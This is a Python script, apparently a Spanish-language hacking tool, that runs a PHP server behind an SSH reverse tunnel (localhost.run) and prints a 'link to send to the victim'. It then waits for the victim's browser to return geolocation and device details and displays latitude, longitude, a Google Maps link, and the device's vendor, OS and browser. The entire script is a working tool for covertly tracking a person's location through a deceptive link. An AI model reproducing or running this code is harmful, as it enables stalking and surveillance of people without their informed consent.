#!/usr/bin/env python
# -*- coding: utf-8 -*-
import json
import time
import os.path
import sys
import subprocess as subp
from colorama import *
init()
br = Style.BRIGHT
rj = Fore.RED
vr = Fore.GREEN
ci = Fore.CYAN
az = Fore.BLUE
am = Fore.YELLOW
ng = Fore.BLACK
bl = Fore.WHITE
bam = Back.YELLOW
baz = Back.BLUE
brj = Back.RED
bci = Back.CYAN
bvr = Back.GREEN
bbl = Back.WHITE
bbg = Back.BLACK
r = Style.RESET_ALL

linea = vr + '_______________________________________________' + r
sign = vr + '[' + r + '-' + vr + ']' + r
warn = am + '[' + r + rj + '!'+ r + am + ']' + r
ubicacion = "ubicacion/php/result.txt"
eubicacion = "ubicacion/php/eresult.txt"
caracteristicas = "ubicacion/php/info.txt"

def banner():
	os.system('clear')
	print (bl + '''		     ██╗ █████╗  ██████╗ ███████╗██████╗ 
		     ██║██╔══██╗██╔════╝ ██╔════╝██╔══██╗
		     ██║███████║██║  ███╗█████╗  ██████╔╝
		██   ██║██╔══██║██║   ██║██╔══╝  ██╔══██╗
		╚█████╔╝██║  ██║╚██████╔╝███████╗██║  ██║
		 ╚════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝\n''' + r)
	print ('        ' + rj + br + '	   .:|' + r + bl + br + ' Localización de dispositivos ' + r + rj + br + '|:.\n' + r)
	print ('		' + brj + ng + '__________________________________________' + r)
	print ('		' + bbl + ng + '__________ Informática y Hacking _________' + r)
	print ('		' + brj + ng + '__________________________________________' + r)
	print ('		' + bbl + ng + '__https://informaticayhacking.github.com__' + r)
	print ('		' + brj + ng + '__________________________________________' + r)
	print ('		' + bbl + ng + '_________t.me/InformaticayHacking_________' + r)
	print ('		' + brj + ng + '__________________________________________\n\n' + r)

os.system('rm ubicacion/php/result.txt')
f = open(ubicacion, "w+")
f.close()
os.system('rm ubicacion/php/eresult.txt')
e = open(eubicacion, 'w+')
e.close()
os.system('clear')
os.system('pkill php')
def conexion():
	ltam = os.path.getsize('jphp.log')
	ltams = os.path.getsize('jssh.log')
	if ltam > 0:
		os.system('rm jphp.log')
	else:
		pass
	if ltams > 0:
		os.system('rm jssh.log')
	else:
		pass
	marc = False
	banner()
	print (sign + ci + br + ' Iniciando servidor...\n' + r)
	time.sleep(4)
	print ()
	try:
		with open('jphp.log', 'w') as jphp:
			subp.Popen(['php', '-S', 'localhost:4646', '-t', 'ubicacion'], stderr=jphp, stdout=jphp)
		with open('jssh.log', 'w') as jssh:
			opr = subp.Popen(['ssh', '-R', '80:localhost:4646', 'nokey@localhost.run'], stdout = jssh)
		time.sleep(5)
		os.system('clear')
		time.sleep(3)
	except NameError:
		time.sleep(3)
		print (warn + rj + br + ' No fué posible establecer una conexión con el tunel ssh.' + r)
		print (warn + am + br + ' Intente reiniciar el proceso.')
		limpiar()
	with open('jssh.log', 'r') as jssh:
		salida = [linea.split() for linea in jssh]
		a = salida[2]
		b = ''.join(a)
		url = b[50:]
	os.system('reset')
	os.system('clear')
	banner()
	print (sign + vr + ' Enlace para enviar a la víctima: ' + r + url)
	esperar()

def esperar():
	marc = False
	try:
		while True:
			try:
				time.sleep(2)
				tam = os.path.getsize(ubicacion)
				tame = os.path.getsize(eubicacion)
				if tam == 0 and marc == False:
					print ('\n' + sign + ci + ' Obteniendo Ubicación...' + r + '\n')
					print (sign + vr + 'Si tarda demasiado,')
					print (sign + vr + 'Presione ' + rj + 'Ctrl + C' + r + am + ' para salir.\n' + r)
					marc = True
				if tam > 0:
					os.system('clear')
					banner()
					print (sign + vr + br + ' Ubicación adquirida con éxito..!\n' + r)
					time.sleep(5)
					os.system('reset')
					break
				elif tame > 0:
					os.system('clear')
					banner()
					print (warn + rj + br + ' No fué posible obtener la ubicación, no se concedió el permiso.' + r)
					time.sleep(3)
					os.system('reset')
					break
				else:
					pass
			except:
				print (warn + am + ' Operación interrumpida por el usuario.' + r)
		else:
			print (sign + rj + 'Error!' + r)
	except:
		limpiar()
		print (warn + am + ' Operación interrumpida por el usuario.' + r)

def detalles():
	try:
		banner()
		with open(ubicacion) as file:
			data = json.load(file)

			for i in data['info']:
				latitud = i["lat"]
				longitud = i["lon"]
				print ('\n' + am + "\n________Ubicación del Dispositivo________\n" + r)
				print (sign + ci + " Latitud" + r + rj + " >> " + r + latitud)
				print (linea)
				print (sign + ci + " Longitud" + r + rj + " >> " + r + longitud)
				print (linea, '\n\n')
				print (sign + vr + " Enlace a Google Maps : " + r + "https://www.google.com/maps/place/" + latitud + ',' + longitud)
				print (linea)

		with open(caracteristicas) as file:
			data = json.load(file)

			for i in data["dev"]:
				Marca = i["vendor"]
				So = i["os"]
				plataforma = i["platform"]
				Navegador = i["browser"]
				print ()
				print (am + '_____Características del Dispositivo_____\n' + r)
				print (sign + ci + " Manufacturador" + r + rj + " >> " + r + Marca)
				print (linea)
				print (sign + ci + " Sistema operativo" + r + rj + " >> " + r + So)
				print (linea)
				print (sign + ci + " Plataforma" + r + rj + " >> " + r + plataforma)
				print (linea)
				print (sign + ci + " Navegador" + r + rj + " >> " + r + Navegador)
				print (linea)
	except:
		banner()
		print (warn + am + br + ' Error de conexión, no se pudo recolectar datos.' + r)
		time.sleep(5)
		limpiar()
def limpiar():
	os.system('pkill php')
	os.system('reset')
	os.system('clear')

def ejecucion():
	limpiar()
	conexion()
	detalles()
ejecucion()
sys.exit()
# Creado por: System Failure | Informática y Hacking © 2023
# https://informaticayhacking.github.com
